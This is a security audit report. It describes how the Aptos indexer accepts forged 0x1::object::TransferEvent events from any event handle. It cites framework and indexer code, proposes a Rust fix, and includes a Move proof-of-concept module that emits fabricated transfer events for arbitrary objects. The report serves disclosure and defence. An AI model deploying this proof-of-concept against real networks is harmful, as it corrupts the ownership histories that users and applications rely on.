# Audit Report

## Title
Indexer Event Source Validation Bypass Allows Injection of Fake Token Transfer History

## Summary
Attackers can create arbitrary `EventHandle<TransferEvent>` instances and emit fake transfer events that the Aptos indexer processes as legitimate, corrupting historical token transfer records and activity logs without bypassing on-chain validation.

## Finding Description

The Aptos indexer accepts `0x1::object::TransferEvent` events from any event handle without validating the event source. While on-chain transfer validation remains intact, this allows attackers to pollute off-chain indexed data.

**Attack Flow:**

1. An attacker creates an `EventHandle<0x1::object::TransferEvent>` in their account using the publicly accessible `account::new_event_handle<T>()` function: [1](#0-0) 

2. The attacker emits fake `TransferEvent` structs (defined in the object framework) using `event::emit_event()`: [2](#0-1) 

3. The native event implementation (`write_to_event_store`) does NOT validate that the event originates from the correct module or event handle—it only requires a valid GUID from any EventHandle: [3](#0-2) 

4. The indexer parses ALL events matching type `"0x1::object::TransferEvent"` without source validation: [4](#0-3) 

5. The processor stores these events if the object address exists in the transaction metadata: [5](#0-4) 

6. Historical ownership records are created using the unvalidated event data: [6](#0-5) 

7. Token activity records are also created with fake from/to addresses: [7](#0-6) 

**Critical Gap:** The indexer retrieves the event handle's creator address from the GUID but never validates that this address matches the object's address or that the event originated from the official `ObjectCore.transfer_events` handle.

## Impact Explanation

This vulnerability does NOT bypass on-chain transfer validation—the actual `ObjectCore.owner` field and transfer permission checks remain secure. However, it corrupts off-chain indexed data:

- **Historical Transfer Records:** Attackers can create fake previous ownership records showing arbitrary "from" addresses
- **Activity Logs:** Token activity tables (`token_activities_v2`) can be populated with fabricated transfers  
- **Analytics & UX:** Wallets, explorers, and dApps relying on indexed transfer history will display incorrect data
- **Audit Trails:** Forensic analysis of token movements becomes unreliable

**Severity Assessment:** **Medium** - "State inconsistencies requiring intervention." While not affecting consensus or causing fund loss, this corrupts critical off-chain infrastructure that users and applications depend on for transaction history and ownership provenance.

## Likelihood Explanation

**High Likelihood:**
- Requires no special privileges—any account can create EventHandles
- Attack is simple to execute (a few lines of Move code)
- The attacker must include fake events in transactions where they create/modify objects, but this is a reasonable constraint
- No rate limiting or detection mechanisms exist

The attack is practical and could be automated to systematically poison indexer data.

## Recommendation

**Immediate Fix:** Validate event source in the indexer by checking that TransferEvents originate from the object's own event handle:

```rust
// In token_processor.rs, modify the transfer event processing:
if let Some(transfer_event) = TransferEvent::from_event(event, txn_version).unwrap() {
    let object_addr = transfer_event.get_object_address();
    
    // NEW: Validate event came from the object's event handle
    let event_creator = standardize_address(&event.guid.account_address.to_string());
    if event_creator != object_addr {
        continue; // Skip events not from the object's own handle
    }
    
    if let Some(aggregated_data) = token_v2_metadata_helper.get_mut(&object_addr) {
        // ... rest of processing
    }
}
```

**Long-term Fix:** Implement event source attestation at the VM level for critical event types, or migrate fully to V2 module events which validate the emitting module: [8](#0-7) 

## Proof of Concept

```move
module attacker::fake_transfer {
    use std::signer;
    use aptos_framework::account;
    use aptos_framework::event::{Self, EventHandle};
    use aptos_framework::object;
    
    struct FakeEventStore has key {
        transfer_events: EventHandle<object::TransferEvent>,
    }
    
    // Attacker initializes their fake event handle
    public entry fun setup(attacker: &signer) {
        move_to(attacker, FakeEventStore {
            transfer_events: account::new_event_handle<object::TransferEvent>(attacker),
        });
    }
    
    // Emit fake transfer event for any object
    public entry fun emit_fake_transfer(
        attacker: &signer,
        object_addr: address,
        fake_from: address,
        fake_to: address
    ) acquires FakeEventStore {
        let store = borrow_global_mut<FakeEventStore>(signer::address_of(attacker));
        
        // Emit fake TransferEvent - indexer will process it
        event::emit_event(
            &mut store.transfer_events,
            object::TransferEvent {
                object: object_addr,
                from: fake_from,
                to: fake_to,
            }
        );
    }
}
```

**Result:** The indexer creates fake historical ownership records and token activities, corrupting transfer history for the targeted object without affecting on-chain state.

---

**Notes:**

This vulnerability demonstrates a critical architectural flaw: trusting event content without source validation in off-chain infrastructure. While it doesn't achieve "bypassing official transfer validation logic" at the consensus layer (the question's apparent premise), it does corrupt the indexed view of blockchain history that users rely on.

### Citations

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L1205-1207)
```text
    public fun new_event_handle<T: drop + store>(account: &signer): EventHandle<T> acquires Account {
        event::new_event_handle(create_guid(account))
    }
```

**File:** aptos-move/framework/aptos-framework/sources/event.move (L54-60)
```text
    public fun emit_event<T: drop + store>(handle_ref: &mut EventHandle<T>, msg: T) {
        write_to_event_store<T>(bcs::to_bytes(&handle_ref.guid), handle_ref.counter, msg);
        spec {
            assume handle_ref.counter + 1 <= MAX_U64;
        };
        handle_ref.counter += 1;
    }
```

**File:** aptos-move/framework/src/natives/event.rs (L102-150)
```rust
fn native_write_to_event_store(
    context: &mut SafeNativeContext,
    ty_args: &[Type],
    mut arguments: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert!(ty_args.len() == 1);
    debug_assert!(arguments.len() == 3);

    let ty = &ty_args[0];
    let msg = arguments.pop_back().unwrap();
    let seq_num = safely_pop_arg!(arguments, u64);
    let guid = safely_pop_arg!(arguments, Vec<u8>);

    // TODO(Gas): Get rid of abstract memory size
    context.charge(
        EVENT_WRITE_TO_EVENT_STORE_BASE
            + EVENT_WRITE_TO_EVENT_STORE_PER_ABSTRACT_VALUE_UNIT * context.abs_val_size(&msg)?,
    )?;
    let ty_tag = context.type_to_type_tag(ty)?;
    let (layout, contains_delayed_fields) = context
        .type_to_type_layout_with_delayed_fields(ty)?
        .unpack();

    let function_value_extension = context.function_value_extension();
    let max_value_nest_depth = context.max_value_nest_depth();
    let blob = ValueSerDeContext::new(max_value_nest_depth)
        .with_delayed_fields_serde()
        .with_func_args_deserialization(&function_value_extension)
        .serialize(&msg, &layout)?
        .ok_or_else(|| {
            SafeNativeError::InvariantViolation(PartialVMError::new(
                StatusCode::UNKNOWN_INVARIANT_VIOLATION_ERROR,
            ))
        })?;
    let key = bcs::from_bytes(guid.as_slice()).map_err(|_| {
        SafeNativeError::InvariantViolation(PartialVMError::new(StatusCode::EVENT_KEY_MISMATCH))
    })?;

    let ctx = context.extensions_mut().get_mut::<NativeEventContext>();
    let event =
        ContractEvent::new_v1(key, seq_num, ty_tag, blob).map_err(|_| SafeNativeError::Abort {
            abort_code: ECANNOT_CREATE_EVENT,
        })?;
    // TODO(layouts): avoid cloning layouts for events with delayed fields.
    ctx.events.push((
        event,
        contains_delayed_fields.then(|| layout.as_ref().clone()),
    ));
    Ok(smallvec![])
```

**File:** aptos-move/framework/src/natives/event.rs (L266-289)
```rust
    let stack_frames = context.stack_frames(1);
    let id = stack_frames
        .stack_trace()
        .first()
        .map(|(caller, _, _)| caller)
        .ok_or_else(|| {
            let err = PartialVMError::new_invariant_violation(
                "Caller frame for 0x1::emit::event is not found",
            );
            SafeNativeError::InvariantViolation(err)
        })?
        .as_ref()
        .ok_or_else(|| {
            // If module is not known, this call must come from the script, which is not allowed.
            let err = PartialVMError::new_invariant_violation("Scripts cannot emit events");
            SafeNativeError::InvariantViolation(err)
        })?;

    if let TypeTag::Struct(ref struct_tag) = type_tag {
        if id != &struct_tag.module_id() {
            return Err(SafeNativeError::InvariantViolation(PartialVMError::new(
                StatusCode::INTERNAL_TYPE_ERROR,
            )));
        }
```

**File:** crates/indexer/src/models/token_models/v2_token_utils.rs (L529-531)
```rust
            "0x1::object::TransferEvent" => {
                serde_json::from_value(data.clone()).map(|inner| Some(Self::TransferEvent(inner)))
            },
```

**File:** crates/indexer/src/processors/token_processor.rs (L1172-1184)
```rust
                if let Some(transfer_event) = TransferEvent::from_event(event, txn_version).unwrap()
                {
                    if let Some(aggregated_data) =
                        token_v2_metadata_helper.get_mut(&transfer_event.get_object_address())
                    {
                        // we don't want index to be 0 otherwise we might have collision with write set change index
                        let index = if index == 0 {
                            user_txn.events.len()
                        } else {
                            index
                        };
                        aggregated_data.transfer_event = Some((index as i64, transfer_event));
                    }
```

**File:** crates/indexer/src/models/token_models/v2_token_ownerships.rs (L166-210)
```rust
        if let Some((event_index, transfer_event)) = &metadata.transfer_event {
            // If it's a self transfer then skip
            if transfer_event.get_to_address() == transfer_event.get_from_address() {
                return Ok(Some((ownership, current_ownership, None, None)));
            }
            Ok(Some((
                ownership,
                current_ownership,
                Some(Self {
                    transaction_version: token_data.transaction_version,
                    // set to negative of event index to avoid collison with write set index
                    write_set_change_index: -1 * event_index,
                    token_data_id: token_data_id.clone(),
                    property_version_v1: BigDecimal::zero(),
                    // previous owner
                    owner_address: Some(transfer_event.get_from_address()),
                    storage_id: storage_id.clone(),
                    // soft delete
                    amount: BigDecimal::zero(),
                    table_type_v1: None,
                    token_properties_mutated_v1: None,
                    is_soulbound_v2: Some(is_soulbound),
                    token_standard: TokenStandard::V2.to_string(),
                    is_fungible_v2: token_data.is_fungible_v2,
                    transaction_timestamp: token_data.transaction_timestamp,
                    non_transferrable_by_owner: Some(is_soulbound),
                }),
                Some(CurrentTokenOwnershipV2 {
                    token_data_id,
                    property_version_v1: BigDecimal::zero(),
                    // previous owner
                    owner_address: transfer_event.get_from_address(),
                    storage_id,
                    // soft delete
                    amount: BigDecimal::zero(),
                    table_type_v1: None,
                    token_properties_mutated_v1: None,
                    is_soulbound_v2: Some(is_soulbound),
                    token_standard: TokenStandard::V2.to_string(),
                    is_fungible_v2: token_data.is_fungible_v2,
                    last_transaction_version: token_data.transaction_version,
                    last_transaction_timestamp: token_data.transaction_timestamp,
                    non_transferrable_by_owner: Some(is_soulbound),
                }),
            )))
```

**File:** crates/indexer/src/models/token_models/v2_token_activities.rs (L186-192)
```rust
                    V2TokenEvent::TransferEvent(inner) => TokenActivityHelperV2 {
                        from_address: Some(inner.get_from_address()),
                        to_address: Some(inner.get_to_address()),
                        token_amount: BigDecimal::one(),
                        before_value: None,
                        after_value: None,
                    },
```
